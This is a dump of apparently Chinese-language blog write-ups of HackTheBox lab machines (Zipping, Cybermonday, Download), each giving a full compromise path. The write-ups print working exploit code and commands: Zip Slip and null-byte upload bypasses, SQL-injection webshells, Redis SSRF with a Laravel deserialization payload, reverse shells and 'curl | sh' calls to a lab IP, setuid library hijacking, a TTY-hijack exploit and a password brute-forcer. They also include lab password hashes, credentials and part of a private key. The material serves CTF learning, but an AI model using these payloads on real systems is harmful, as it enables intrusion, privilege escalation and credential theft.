Linux; CPE: cpe:&#x2F;o:linux:linux_kernelService detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 78.83 seconds 80一个在线商店： Zip SlipWORK WITH US那里可以上传zip文件，上传后会自动解压,并给出文件路径： Zip Slip这种场景，结合机器名，Zip Slip： PayloadsAllTheThings/Upload Insecure Files/Zip Slip/README.md at master · swisskyrepo/PayloadsAllTheThingshttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Zip%20Slip/README.md 123ln -sf /etc/passwd evil.pdf# -y store symbolic links as the link instead of the referenced filezip -y passwd.zip evil.pdf 验证存在： zip.py自动化脚本，来自@Prometeo： 1234567891011121314151617181920212223242526272829303132333435363738394041import osfrom bs4 import BeautifulSoupimport requestsif not os.path.exists(\"tmp\"): os.mkdir(\"tmp\") file_to_read = input(\"File to read: \")print(\"Creating symlink..\")os.chdir(\"tmp/\")os.system(f\"ln -s &#123;file_to_read&#125; symlink.pdf\")print(\"Zipping..\")os.system(f\"zip -y sym.zip symlink.pdf\")os.system(f\"rm symlink.pdf &amp;&amp; cp sym.zip ../\")print(\"Done! Zip file: sym.zip\")print(\"Uploading file..\")MIP = \"10.10.11.229\"file = &#123; 'zipFile': ('sym.zip', open('sym.zip', 'rb'), 'application/zip'), 'submit': (None, '')&#125;headers = &#123;\"Host\":MIP,\"User-Agent\":\"Mozilla/5.0 (X11;Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\"&#125;s = requests.Session()r = s.get(f\"http://&#123;MIP&#125;\",headers=headers)r = s.get(f\"http://&#123;MIP&#125;/upload.php\", headers=headers)r = s.post(f\"http://&#123;MIP&#125;/upload.php\",files=file, headers=headers)soup = BeautifulSoup(r.text,features=\"lxml\")uuid=\"\"for a in soup.find_all(\"a\",href=True): if \"uploads\" in a['href']: uuid = a['href'].split(\"/\")[1] print(\"File UUID: \",uuid)print(\"\\nReading file..\")r = s.get(f\"http://&#123;MIP&#125;/uploads/&#123;uuid&#125;/symlink.pdf\")print(r.text) LFI现在可以通过Zip Slip来读取文件，然后就是读代码： /var/www/html/upload.php根据代码，文件后缀有校验，需要是pdf才会解压： 但很容易使用空字节绕过： 🛠️ Null-byte injection - The Hacker Recipeshttps://www.thehacker.recipes/web/inputs/null-byte-injection webshell所以就是使用包含空字节的文件名，通过pdf校验，解压后释放的实际是php文件： 12mv rev.php rev.phpX.pdfzip rev.zip rev.phpX.pdf 然后使用16进制编辑器修改zip中的文件名，把X的58改成空字节的00，注意zip中会出现两次文件名，校验使用的后一个： 上传，给出的链接去掉后面的pdf后访问触发shell，得到rektsu： 预期方法 HTB: Zipping | 0xdf hacks stuffhttps://0xdf.gitlab.io/2024/01/13/htb-zipping.html 预期是product那里换行符绕过，注入写文件： 1234http:&#x2F;&#x2F;10.10.11.229&#x2F;shop&#x2F;index.php?page&#x3D;product&amp;id&#x3D;%0A100&#39;+or+&#39;1&#39;&#x3D;&#39;1sqlmap -u &quot;http:&#x2F;&#x2F;10.10.11.229&#x2F;shop&#x2F;?page&#x3D;product&amp;id&#x3D;1&quot; --prefix &quot;%0A%0D&#39;&quot; --suffix&#x3D;&quot;&#39;-- -1&quot; -p id --batch --level 2id&#x3D;%0A100&#39;+union+select+&quot;&lt;?php+phpinfo();+?&gt;&quot;,2,3,4,5,6,7,8+into+outfile+&quot;&#x2F;tmp&#x2F;0xdf.php&quot;;--+-1id&#x3D;%0A100&#39;+union+select+&quot;&lt;?php+system($_REQUEST[&#39;cmd&#39;]);+?&gt;&quot;,2,3,4,5,6,7,8+into+outfile+&quot;&#x2F;dev&#x2F;shm&#x2F;shell.php&quot;;--+-1 然后再通过index那里的poge参数去执行webshell： 1index.php?page&#x3D;&#x2F;dev&#x2F;shm&#x2F;shell.php user flagrektsu用户目录: 然后写公钥之类的方便后续操作 提权信息可以sudo运行一个stock elf文件： 尝试运行需要密码，直接strings就能得到密码： 1St0ckM4nager strace追踪调用，发现加载了一个用户目录下的libcounter.so: 1234strace /usr/bin/stockSt0ckM4nager/home/rektsu/.config/libcounter.so 所以就是一个很简单的劫持，自定义一个恶意so替换即可: Linux Privilege Escalation - HackTrickshttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path 提权 &amp; root flag靶机上有gcc，直接编译替换即可： 123gcc -shared -fPIC -nostartfiles -o libcounter.so exp.ccp libcounter.so /home/rektsu/.config/libcounter.so 然后正常执行功能，触发命令执行： exp.c1234567#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void _init() &#123; setuid(0); setgid(0); system(\"chmod u+s /bin/bash\");&#125; shadow12root:$y$j9T$IYa44JPNfCWV4rqT1W1Kj&#x2F;$xiHZCNOyiAOLgnHZ06gdF9jWPNR9ixmhsCwFu0Hgy9&#x2F;:19548:0:99999:7:::rektsu:$y$j9T$wWBMg&#x2F;LAoOoUB448jkabg.$8ivoFrxatQTk89&#x2F;GmgCMdoByo9a1o.l8GK&#x2F;Xo8BnwT3:19548:0:99999:7::: 参考资料 PayloadsAllTheThings/Upload Insecure Files/Zip Slip/README.md at master · swisskyrepo/PayloadsAllTheThingshttps://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Zip%20Slip/README.md 🛠️ Null-byte injection - The Hacker Recipeshttps://www.thehacker.recipes/web/inputs/null-byte-injection Linux Privilege Escalation - HackTrickshttps://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path HTB: Zipping | 0xdf hacks stuffhttps://0xdf.gitlab.io/2024/01/13/htb-zipping.html","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Cybermonday - HackTheBox","slug":"Cybermonday-HackTheBox","date":"2023-08-23T03:18:13.000Z","updated":"2023-12-04T01:28:06.434Z","comments":true,"path":"2023/08/23/Cybermonday-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/08/23/Cybermonday-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Cybermonday 10.10.11.228 端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.228Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-21 14:00 CSTNmap scan report for 10.10.11.228Host is up (0.12s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:| 3072 74:68:14:1f:a1:c0:48:e5:0d:0a:92:6a:fb:c1:0c:d8 (RSA)| 256 f7:10:9d:c0:d1:f3:83:f2:05:25:aa:db:08:0e:8e:4e (ECDSA)|_ 256 2f:64:08:a9:af:1a:c5:cf:0f:0b:9b:d2:95:f5:92:32 (ED25519)80/tcp open http nginx 1.25.1|_http-title: Did not follow redirect to http://cybermonday.htbService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 52.47 seconds 80需要加hosts： 110.10.11.228 cybermonday.htb 一个在线商城： cybermonda随意注册登录，cookie是base64编码json: debug mode注册时尝试sql注入，例如使用miao&#39;作为用户名，报错发现开了debug mode： 其中可以看到有一个isAdmin属性： isAdmin回到正常用户，有一个更新Profile的功能，更新的时候尝试添加isAdmin参数，成功成为管理员,多了一个Dashboard： Dashboardchangelog中发现webhook子域名，同样添加hosts： 110.10.11.228 cybermonday.htb webhooks-api-beta.cybermonday.htb LFI这里测试还可以发现一个路径穿越导致LFI,nginx配置的问题，配置文件中使用alias，上下不一致： 三个案例看Nginx配置安全 | 离别歌https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html .git同样存在git泄漏，结合上面的路径穿越： 123http://cybermonday.htb/assets../.git/configgit-dumper \"http://cybermonday.htb/assets../.git\" git_dump webhook访问给出的webhook是404，直接访问根路径给出api信息： x-access-token根据API注册登录，得到x-access-token是JWT,其中role是user： Webhooks使用得到的token查看webhooks,uuid就是dashboard里显示的那个： 现有的action是createLogFile，根据API调用，响应成功，但不知道写入位置： 当前token因为是user，创建webhook无权限 JWT基础的探测可以发现jwks.json: 1http:&#x2F;&#x2F;webhooks-api-beta.cybermonday.htb&#x2F;jwks.json Algorithm confusion现有信息，有jwks，有user的jwt，需要admin的jwt，这种场景： Algorithm confusion attacks | Web Security Academyhttps://portswigger.net/web-security/jwt/algorithm-confusion JWT Vulnerabilities (Json Web Tokens) - HackTrickshttps://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#change-the-algorithm-rs256-asymmetric-to-hs256-symmetric-cve-2016-5431-cve-2016-10555 根据参考资料内容，首先提取出公钥，然后倒入到Burp扩展中测试利用： 1234python3 ~/Tools/jwt_tool/jwt_tool.py -t http://webhooks-api-beta.cybermonday.htb/webhooks -rh \"x-access-token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6NSwidXNlcm5hbWUiOiJtaWFvIiwicm9sZSI6InVzZXIifQ.cIue1XS4uxo6dUVE8XLsMlFHrXghXju0mTtKvr9mzAUezYku6z8JAQuWHWsvnNesdqZCbHgKIsegWFe4H-k-PgxewNHWpdB8gy90r0k2J4oS7Ddo0_79SApjKgKOuXF1gYDmpKYu1IK2wmeVF7v6tkhPDsJmEgXWEBnHvmAWCP70PIBtgGUXqI25L7BxLmkPnnItX4lvvRrr7Vcm7x7XFfzvAI_ZdfsBYZaDRC6wqGnFsQtt7zIEXriUgPrQZpIe_nHXWOAqfifSDDyOCWOorxu8WKIJ2pSb0wi9ujMSxmzqMKPccZuGZlasGMneoYSCbEedJZPvOMJHFGfBYwAq_g\" -V -jw jwks.jsonFound RSA key factors, generating a public key[+] kid_0_1692601371.pem 导入Burp扩展后，修改jwt内容，使用Attack-&gt;HMAC key Confusion方式，选择我们导入的pem，签名后发送，现在我们是admin，可以创建新的webhook使用sendRequest action： sendRequest现在可以调用我们创建的webhook使用sendRequest方法，根据api是url和method两个参数，url必须http协议，method可以任意： redis slaveof已有条件只能SSRF，根据前面LFI中得到的一些信息，尝试使用redis的slaveof： 1&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;redis:6379&quot;,&quot;method&quot;:&quot;slaveof 10.10.16.2 6379\\r\\n\\r\\n&quot;&#125; 可以接收到来自redis的ping请求： 修改请求通过主从获取redis中数据(主站那里正常登录触发)： 1&#123;&quot;url&quot;:&quot;http:&#x2F;&#x2F;redis:6379&quot;,&quot;method&quot;:&quot;EVAL &#39;for k,v in pairs(redis.call(\\&quot;KEYS\\&quot;, \\&quot;*\\&quot;)) do redis.pcall(\\&quot;MIGRATE\\&quot;,\\&quot;10.10.16.2\\&quot;,\\&quot;6379\\&quot;,v,0,200) end&#39; 0\\r\\n*1\\r\\n$20\\r\\n&quot;&#125; Laravel现在已有条件，可以控制Laravel用到的redis，那就可以尝试修改redis中的数据来打反序列化： 注意修改payload中对应的长度，以及引号和斜杠的转义: 123~/Tools/phpggc/phpggc Laravel/RCE10 system 'curl 10.10.16.2:7777'&#123;\"url\": \"http://redis:6379\",\"method\": \"*3\\r\\n$3\\r\\nset\\r\\n$56\\r\\nlaravel_session:57VLa9wNMwVgQp0NGnBckednmh0LCTS0OFnYlVGT\\r\\n$238\\r\\nO:38:\\\"Illuminate\\\\Validation\\\\Rules\\\\RequiredIf\\\":1:&#123;s:9:\\\"condition\\\";a:2:&#123;i:0;O:28:\\\"Illuminate\\\\Auth\\\\RequestGuard\\\":3:&#123;s:8:\\\"callback\\\";s:14:\\\"call_user_func\\\";s:7:\\\"request\\\";s:6:\\\"system\\\";s:8:\\\"provider\\\";s:20:\\\"curl 10.10.16.2:7777\\\";&#125;i:1;s:4:\\\"user\\\";&#125;&#125;\\r\\n*1\\r\\n$4\\r\\nquit\\r\\n\"&#125; 发送后回到首页刷新，触发反序列化： cookie decryptredis中的key是session id，也可以直接从cookie中解密得到，需要的app_key在前面的env中可以得到： Laravel - HackTrickshttps://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel#decrypt-cookie 12345678910111213&lt;?php $cookie = \"eyJpdiI6InhIanpFV0VuMkJlam9wOW81UTRrTXc9PSIsInZhbHVlIjoiNTZ2d2Urd0FQSWRKdURzZnZLK25GbWg1bzZNSUovczdkcENWdTVzaU1ZYnVYWVVUZXd5V1lvT3pvVXFvd2t2ZHNtbjIzVDZ1eElDVTgvaHlPYk5pbEczWkRCOElPbUxaVS8waDB3ODhRNHRkSm9uQVIxcGd5Q29ZZ0ZrV3AwK04iLCJtYWMiOiIzMDAxYzNiMDU2MzAyNTA1Y2YwYWUxNzFjNzE4ODRlY2MzNGQ0MDMwMjVjNzE2YWZjNjRhY2U5NzdjNTAyYjJhIiwidGFnIjoiIn0=\"; $app_key = base64_decode(\"EX3zUxJkzEAY2xM4pbOfYMJus+bjx6V25Wnas+rFMzA=\"); $cookie_decoded = json_decode(base64_decode($cookie)); $iv = base64_decode($cookie_decoded-&gt;iv); $value = base64_decode($cookie_decoded-&gt;value); $result = openssl_decrypt($value, \"AES-256-CBC\", $app_key, OPENSSL_RAW_DATA, $iv); var_dump($result);?&gt; shell同样的反序列化方法，得到www-data shell: 1234~/Tools/phpggc/phpggc Laravel/RCE10 system 'curl 10.10.16.2:7777/shell | sh'# shellbash -c \"/bin/bash -i &gt;&amp; /dev/tcp/10.10.16.2/4444 0&gt;&amp;1\" Docker前面的env中也可以知道CHANGELOG_PATH=&quot;/mnt/changelog.txt&quot;,去查看mnt目录发现user .txt,但当前没有权限读取: docker Registry容器内很多命令都没有，简单的探测，根据hosts知道网段，registry默认5000端口一个个探测，发现172.18.0.3(不固定，也可能是其他ip): 然后就是转发端口： 123456# local./chisel_1.7.0-rc7_darwin_amd64 server -p 9999 --reverse# targetcurl http://10.10.16.2:7777/chisel_1.7.6_linux_amd64 -o chiselchmod +x ./chisel./chisel client 10.10.16.2:9999 R:5000:172.18.0.3:5000 dump: 5000 - Pentesting Docker Registry - HackTrickshttps://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry Syzik/DockerRegistryGrabber: Enumerate / Dump Docker Registryhttps://github.com/Syzik/DockerRegistryGrabber 1234python3 DockerGraber.py http://127.0.0.1 --list[+] cybermonday_apipython3 DockerGraber.py http://127.0.0.1 --dump cybermonday_api LogsControllerdump得到的文件中读代码，LogsController中发现list和read的action，需要用的api key在heapers/apis.php里： 1$this-&gt;api_key = \"22892e36-1770-11ee-be56-0242ac120002\"; list只能看action是createLogFile的webhook的日志目录，read也有很多过滤： Logs LFI根据前面的代码，过滤规则是： 不允许出现 ../ 会去掉空格 文件名中中必须包含log 那如果是. ./,这样的，能够通过第一层校验，然后空格被去掉变成了正常的../: 读取环境变量信息，得到一个密码： 1DBPASS&#x3D;ngFfX2L71Nu 另外容器内读文件可以知道用户名是john: user flag得到的用户名密码登录: 12ssh john@10.10.11.228ngFfX2L71Nu 提权信息sudo可以运行一个py调用docker-compose： 查看内容，就是调用docker-compose加载运行yml文件之前进行各种检查： 白名单路径 read only 不允许软链接 no privileged 通过检查之后就是docker-compose up --build我们指定的yml文件 很容易想到的方法是磁盘映射到容器，并且容器启动时可以自动执行命令来得到容器shell进行后续操作，所以就是准备一个恶意yml文件进行利用： Compose file version 3 reference | Docker Docshttps://docs.docker.com/compose/compose-file/compose-file-v3/#devices secure_compose.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112#!/usr/bin/python3import sys, yaml, os, random, string, shutil, subprocess, signaldef get_user(): return os.environ.get(\"SUDO_USER\")def is_path_inside_whitelist(path): whitelist = [f\"/home/&#123;get_user()&#125;\", \"/mnt\"] for allowed_path in whitelist: if os.path.abspath(path).startswith(os.path.abspath(allowed_path)): return True return Falsedef check_whitelist(volumes): for volume in volumes: parts = volume.split(\":\") if len(parts) == 3 and not is_path_inside_whitelist(parts[0]): return False return Truedef check_read_only(volumes): for volume in volumes: if not volume.endswith(\":ro\"): return False return Truedef check_no_symlinks(volumes): for volume in volumes: parts = volume.split(\":\") path = parts[0] if os.path.islink(path): return False return Truedef check_no_privileged(services): for service, config in services.items(): if \"privileged\" in config and config[\"privileged\"] is True: return False return Truedef main(filename): if not os.path.exists(filename): print(f\"File not found\") return False with open(filename, \"r\") as file: try: data = yaml.safe_load(file) except yaml.YAMLError as e: print(f\"Error: &#123;e&#125;\") return False if \"services\" not in data: print(\"Invalid docker-compose.yml\") return False services = data[\"services\"] if not check_no_privileged(services): print(\"Privileged mode is not allowed.\") return False for service, config in services.items(): if \"volumes\" in config: volumes = config[\"volumes\"] if not check_whitelist(volumes) or not check_read_only(volumes): print(f\"Service '&#123;service&#125;' is malicious.\") return False if not check_no_symlinks(volumes): print(f\"Service '&#123;service&#125;' contains a symbolic link in the volume, which is not allowed.\") return False return Truedef create_random_temp_dir(): letters_digits = string.ascii_letters + string.digits random_str = ''.join(random.choice(letters_digits) for i in range(6)) temp_dir = f\"/tmp/tmp-&#123;random_str&#125;\" return temp_dirdef copy_docker_compose_to_temp_dir(filename, temp_dir): os.makedirs(temp_dir, exist_ok=True) shutil.copy(filename, os.path.join(temp_dir, \"docker-compose.yml\"))def cleanup(temp_dir): subprocess.run([\"/usr/bin/docker-compose\", \"down\", \"--volumes\"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) shutil.rmtree(temp_dir)def signal_handler(sig, frame): print(\"\\nSIGINT received. Cleaning up...\") cleanup(temp_dir) sys.exit(1)if __name__ == \"__main__\": if len(sys.argv) != 2: print(f\"Use: &#123;sys.argv[0]&#125; &lt;docker-compose.yml&gt;\") sys.exit(1) filename = sys.argv[1] if main(filename): temp_dir = create_random_temp_dir() copy_docker_compose_to_temp_dir(filename, temp_dir) os.chdir(temp_dir) signal.signal(signal.SIGINT, signal_handler) print(\"Starting services...\") result = subprocess.run([\"/usr/bin/docker-compose\", \"up\", \"--build\"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) print(\"Finishing services\") cleanup(temp_dir) 提权 &amp; root flag宿主机查看磁盘信息确认是sda1，然后就是准备恶意yml文件后运行，得到的容器shell内debugfs读文件： 1234567891011john@cybermonday:~$ lsblkNAME MAJ:MIN RM SIZE RO TYPE MOUNTPOINTsda 8:0 0 7G 0 disk|-sda1 8:1 0 6G 0 part /`-sda2 8:2 0 1023M 0 part [SWAP]sudo /opt/secure_compose.py miao.yml# 容器内debugfs /dev/sda1cat /root/root.txt miao.yml1234567version: \"3.0\"services: malicious-service: image: cybermonday_api devices: - /dev/sda1:/dev/sda1 command: bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.2/4444 0&gt;&amp;1' shadow12root:$y$j9T$kndrQlLwiIgjD3Jegw0bP0$8gT7HQZoAIe6owK9kIDzj4qriqKfygMooOkk5go9i40:19506:0:99999:7:::john:$y$j9T$GjbNtuqeiU3F8AVjXki&#x2F;F1$E.mwZgDhVYWBR8UfeQDDO91&#x2F;Z8cGKOW.ec0iK9Xj017:19569:0:99999:7::: 参考资料 三个案例看Nginx配置安全 | 离别歌https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html Algorithm confusion attacks | Web Security Academyhttps://portswigger.net/web-security/jwt/algorithm-confusion JWT Vulnerabilities (Json Web Tokens) - HackTrickshttps://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#change-the-algorithm-rs256-asymmetric-to-hs256-symmetric-cve-2016-5431-cve-2016-10555 Laravel - HackTrickshttps://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel#decrypt-cookie 5000 - Pentesting Docker Registry - HackTrickshttps://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry Syzik/DockerRegistryGrabber: Enumerate / Dump Docker Registryhttps://github.com/Syzik/DockerRegistryGrabber Compose file version 3 reference | Docker Docshttps://docs.docker.com/compose/compose-file/compose-file-v3/#devices","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Keeper - HackTheBox","slug":"Keeper-HackTheBox","date":"2023-08-14T07:05:22.000Z","updated":"2023-08-14T07:06:20.007Z","comments":true,"path":"2023/08/14/Keeper-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/08/14/Keeper-HackTheBox/","excerpt":"有东西被加密了, 请输入密码查看.","text":"您好, 这里需要密码. root hash: $y$j9T$ZskeM1******9cpM.VBM5 ","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Download - HackTheBox","slug":"Download-HackTheBox","date":"2023-08-08T05:36:26.000Z","updated":"2023-11-13T03:15:36.522Z","comments":true,"path":"2023/08/08/Download-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/08/08/Download-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Download 10.10.11.226 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV -Pn 10.10.11.226Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-07 15:33 CSTNmap scan report for 10.10.11.226Host is up (0.16s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 cc:f1:63:46:e6:7a:0a:b8:ac:83:be:29:0f:d6:3f:09 (RSA)| 256 2c:99:b4:b1:97:7a:8b:86:6d:37:c9:13:61:9f:bc:ff (ECDSA)|_ 256 e6:ff:77:94:12:40:7b:06:a2:97:7a:de:14:94:5b:ae (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)|_http-title: Did not follow redirect to http://download.htbService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 63.16 seconds 80需要加hosts,在线文件共享： 110.10.11.226 download.htb Download尝试注册报错(后面根据代码可以知道是用户名有最短长度要求)，但可以匿名上传下载，文件名是uuid： LFI根据响应头知道是Express，可以猜测代码大概类似这样： 123456# route &#x2F;download&#x2F;&#123;file_name&#125;return &#123;file_name&#125;..&#x2F;xxxx..%2fxxxx 那可以尝试读取其他文件，因为是Express，尝试读取app.js,注意编码,验证存在LFI,并且代码中得到download_session使用的key： 12name: \"download_session\",keys: [\"8929874489719802418902487651347865819634518936754\"] package.json同样的方法读取package.json，得到用户名wesley(这个用户名也可以通过修改id得到)： auth.jsauth里可以知道用户名有最短长度要求： download_session根据前面的信息重新注册登录，得到的cookie解码，发现user相关信息： 12345678910111213&#123; \"flashes\": &#123; \"info\": [], \"error\": [], \"success\": [ \"You are now logged in.\" ] &#125;, \"user\": &#123; \"id\": 73, \"username\": \"miao@miao.com\" &#125;&#125; express cookie，已有key，可以使用cookie-monster签名 DigitalInterruption/cookie-monster: A utility for automating the testing and re-signing of Express.js cookie secrets.https://github.com/DigitalInterruption/cookie-monster 尝试直接修改id为1，去掉用户名，生成新cookie，然后查看home得到WESLEY上传的文件： 1cookie-monster -e -f cookie.json -k 8929874489719802418902487651347865819634518936754 -n download_session 但文件中并没什么有用信息 home继续看代码，Home.js发现prisma： 根据文档查看prisma文件： Working with PrismaClient (Concepts)https://www.prisma.io/docs/concepts/components/prisma-client/working-with-prismaclient 1http:&#x2F;&#x2F;download.htb&#x2F;files&#x2F;download&#x2F;..%2fnode_modules%2f.prisma%2fclient%2fschema.prisma user model中有username和password，而prisma可以使用一些条件进行过滤： Filtering and Sorting (Concepts)https://www.prisma.io/docs/concepts/components/prisma-client/filtering-and-sorting brute password后面就是根据这些信息，通过使用prisma支持的过滤条件来爆破出wesley的密码md5，解出来密码(爆破脚本来自discord)： 1234$ python3 brute.pyf88976c10af66915918945b9679b2bd3dunkindonuts brute.py1234567891011121314151617181920212223242526272829303132import string, subprocess, json, re, requestsregex = r\"download_session=([\\w=\\-_]+).*download_session\\.sig=([\\w=\\-_]+)\"def writeJson(j): with open(\"cookie.json\", \"w\") as f: f.write(json.dumps(j)) def generateCookieAndSign(startsWith): j = &#123;\"user\":&#123;\"username\":&#123;\"contains\": \"WESLEY\"&#125;, \"password\":&#123;\"startsWith\":startsWith&#125;&#125;&#125; writeJson(j) out = subprocess.check_output([\"cookie-monster\", \"-e\", \"-f\", \"cookie.json\", \"-k\", \"8929874489719802418902487651347865819634518936754\", \"-n\", \"download_session\"]).decode().replace(\"\\n\",\" \") matches = re.findall(regex, out, re.MULTILINE)[0] return matches passwd = \"\"alphabet=\"abcdef\"+string.digitsfor i in range(32): #print(passwd) for s in alphabet: p = passwd + s (download_session, sig) = generateCookieAndSign(p) cookie = &#123;\"download_session\": download_session, \"download_session.sig\": sig&#125; #print(p, cookie) print(p, end='\\r') r = requests.get('http://download.htb/home/', cookies=cookie) if len(r.text) != 2174: passwd = p breakprint()print(passwd) user flag得到的账号密码ssh登录： 12ssh wesley@10.10.11.226dunkindonuts 提权信息pspy发现root定期切换到postgres执行一些操作： 123cat /etc/passwd | grep postgresqlpostgres:x:113:118:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash 枚举服务可以发现download-site， 对应文件里得到pstgresql数据库账号密码: 1234systemctl list-units --type=servicecat /etc/systemd/system/download-site.servicepostgresql://download:CoconutPineappleWatermelon@localhost:5432/download postgresql得到的信息连接postgresql数据库,发现有写文件权限,可以通过数据库向postgresql用户目录写文件 再结合前面root会定期切换到postgresql用户，这种场景可以劫持root用户tty来执行一些文件： su/sudo from root to another user allows TTY hijacking and arbitrary code executionhttps://ruderich.org/simon/notes/su-sudo-from-root-tty-hijacking 123psql \"postgresql://download:CoconutPineappleWatermelon@localhost:5432/download\"download=&gt; \\du 提权 &amp; root flagroot su切换到postgresql，会自动加载postgresql用户目录的bashrc,bash_profile之类文件并执行其中命令，而结合前面信息，可以通过postgresql数据库向postgresql用户目录写文件 那就是本地编译exp，通过数据库写文件，然后等待root触发执行： 1234gcc exp.c -static -o exp# postgresql数据库内download=&gt; COPY (SELECT CAST('/tmp/miao/exp;' AS text)) TO '/var/lib/postgresql/.bash_profile'; exp.c1234567891011121314151617181920#include &lt;fcntl.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;sys/ioctl.h&gt;int main() &#123; int fd = open(\"/dev/tty\", O_RDWR); if (fd &lt; 0) &#123; perror(\"open\"); return -1; &#125; char *x = \"exit\\nchmod +s /bin/bash\\n\"; while (*x != 0) &#123; int ret = ioctl(fd, TIOCSTI, x); if (ret == -1) &#123; perror(\"ioctl()\"); &#125; x++; &#125; return 0;&#125; shadow12root:$6$1MketXLaRIbeeHXh$B.wJMAZJb5kkVDvTP3UG283rTDEEf3nQDtxppPONWfIdHBoQtm3rm3EHphGpKJsLq39xK7zzScJIhLBDcK8&#x2F;Y.:19468:0:99999:7:::wesley:$6$6Vmkfr1F2be5&#x2F;zab$AHFgSffUU2erjnzMtyxtIrOQWa3vz7Apra0tAnphA4Nf&#x2F;&#x2F;3Fx.JK7M9IKjlseHjhbFIb8Cwif9sS60QDwXbUV&#x2F;:19468:0:99999:7::: root_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAujwNrqfNTl8m6lj4O7wHjMUHF1iMNZcAG5bNCdEM1qXp5bYWGlAqjcGJkuuivPRleq1437sQJHC499sXUzo1pz5UHJxKdQLPN9BJiWdWFUahXgJ5msGJsnxBCo0itJjMboZTL9tfdmIooBh&#x2F;D02aWDJpIPt&#x2F;95SlNKtbiIWSr9rD+PQwRLpmxlOsq3PIH2SvS1YO21PhX5ZxINrIH+Gt+epgDRQHgWbtbn4ZlEml5ayRzqtqqszRV8LOimU+1u6&#x2F;d+i0Y114KRNnWNem+d0yj3LLmusVOD2peM+MvHPUJhvp+SRJYPYQg&#x2F;RP9m0bEd4xpxEVoCN6odD34gj6m1RegFXVEtiV97K9BxuhTaapvSl3pJyBTvq1Xd3SyfkPsRWEfb4Wfq+fR+8lxuuNo2ugStI2vl+Q71v1XxBqj60b8AM6b50AqFbA0Xzw6c9yTQ0YLNOwox&#x2F;pBMNynMn0&#x2F;iFP22UgNHevvUtfY0oLMIsxmq9h3EfswjdNWBHwyKWQhWnfAAAFiCM7ziIjO84iAAAAB3NzaC1yc2EAAAGBALo8Da6nzU5fJupY+Du8B4zFBxdYjDWXABuWzQnRDNal6eW2FhpQKo3BiZLrorz0ZXqteN+7ECRwuPfbF1M6Nac+VBycSnUCzzfQSYlnVhVGoV4CeZrBibJ8QQqNIrSYzG6GUy&#x2F;bX3ZiKKAYfw9NmlgyaSD7f&#x2F;eUpTSrW4iFkq&#x2F;aw&#x2F;j0MES6ZsZTrKtzyB9kr0tWDttT4V+WcSDayB&#x2F;hrfnqYA0UB4Fm7W5+GZRJpeWskc6raqrM0VfCzoplPtbuv3fotGNdeCkTZ1jXpvndMo9yy5rrFTg9qXjPjLxz1CYb6fkkSWD2EIP0T&#x2F;ZtGxHeMacRFaAjeqHQ9+II+ptUXoBV1RLYlfeyvQcboU2mqb0pd6ScgU76tV3d0sn5D7EVhH2+Fn6vn0fvJcbrjaNroErSNr5fkO9b9V8Qao+tG&#x2F;ADOm+dAKhWwNF88OnPck0NGCzTsKMf6QTDcpzJ9P4hT9tlIDR3r71LX2NKCzCLMZqvYdxH7MI3TVgR8M